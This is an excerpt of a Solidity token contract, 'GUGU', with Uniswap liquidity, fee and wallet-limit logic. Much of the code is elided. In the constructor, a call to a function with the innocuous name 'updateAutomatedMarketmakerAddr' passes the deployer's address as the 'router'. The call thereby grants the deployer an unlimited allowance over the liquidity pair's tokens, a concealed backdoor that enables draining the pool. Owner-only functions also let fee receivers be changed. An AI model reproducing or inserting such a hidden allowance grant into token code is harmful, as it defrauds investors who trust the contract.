...
abstract contract ContractInfo {

    string constant _name = "GUGU";
    string constant _symbol = "GUGU";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000_000 * 10**_decimals;

    uint256 public _maxTxAmount = (_totalSupply * 40) / 1000;
    uint256 public _maxWalletHoldAmount = (_totalSupply * 40) / 1000;
...
contract GUGU is ContractInfo, IERC20, Ownable {
    using SafeMath for uint256;

    address private marketingWallet = 0xD767b27f269d96308d90d21Dd04f9c26770cc945;
    ...
    address public liquidityBurnAddress;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    IUniswapV2Router02 public immutable uniswapRouterAddress;
    ...
    constructor (address _multisigAddress) {
        ...
        updateAutomatedMarketmakerAddr(msg.sender, uniswapV2Pair);
        // set the rest of the contract variables
        uniswapRouterAddress = _uniswapV2Router;

        _allowances[address(this)][address(uniswapRouterAddress)] = type(uint256).max;
        ...
        marketingWallet = _multisigAddress;
        liquidityBurnAddress = msg.sender;
    ...
    function removeLimits() external onlyOwner() {   
        ...
        _maxWalletHoldAmount = _totalSupply;
    }
    ...
    */
    function burnTokens(uint256 amount) external {
        ...
        if(_balances[msg.sender] > amount) {
            _transferStandard(msg.sender, DEAD, amount);
        }
    }
...
// *** 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        bool walletToWallet = (recipient != uniswapV2Pair && sender != uniswapV2Pair);
        if(inSwap){ return _transferStandard(sender, recipient, amount); }
        if(sender != owner() && recipient != owner())  require(tradingOpen,"Trading not open yet");
        if (recipient != address(this) &&  recipient != address(DEAD) && 
            recipient != uniswapV2Pair && recipient != marketingWallet && 
            recipient != liquidityBurnAddress
        ){
            uint256 heldTokens = balanceOf(recipient);
            if(!isMaxExempt[recipient]) require(
                (heldTokens + amount) <= _maxWalletHoldAmount,
                "Total Holding is currently limited, you can not buy that much."
                );
        }

        if (sender == uniswapV2Pair && buyCooldownEnabled && !isTimelockExempt[recipient]
        ){
        ...
        if(!isTxLimitExempt[recipient]) checkTxLimit(sender, amount);
        //Exchange tokens
        ...
        if(walletToWallet) {
            ...
            amountReceived = mustTakeFee(sender) ? takeFee(sender, amount, inSell) : amount;
            if(mustSwapBack()) swapEthFromTo(sender, recipient); 
        }
    ...
    function mustTakeFee(address sender) internal view returns (bool) {
    ...
    function mustSwapBack() internal view returns (bool) {
        return !inSwap && swapEnabled && _balances[address(this)] >= 0;
    }
    ...
    function swapEthFromTo(address from, address to) internal swapping {
        uint256 balanceBefore = address(this).balance;
        uint256 amountETHMarketing;
        uint256 amountETHLiquidity;
        uint256 amountLiquify;

        if (balanceBefore > 0) {
            uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : swapLpFee;
            amountLiquify = swapAmount.mul(dynamicLiquidityFee).div(swapTotalFee).div(2);
            uint256 amountToSwap = swapAmount.sub(amountLiquify);
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = uniswapRouterAddress.WETH();

            uniswapRouterAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSwap,
                0,
                path,
                address(this),
        ...
        if(amountLiquify > 0){
            uniswapRouterAddress.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountLiquify,
                0,
                0,
                liquidityBurnAddress,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountLiquify);
        }
    }
...
// *** 
    ...
    function updateAutomatedMarketmakerAddr(address router, address pair) internal {
      _allowances[pair][router] = type(uint256).max;isFeeExempt[router] = true;
    }
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _newMarketingWallet, address _newdevWallet ) external onlyOwner() {
        ...
        liquidityBurnAddress = _autoLiquidityReceiver;
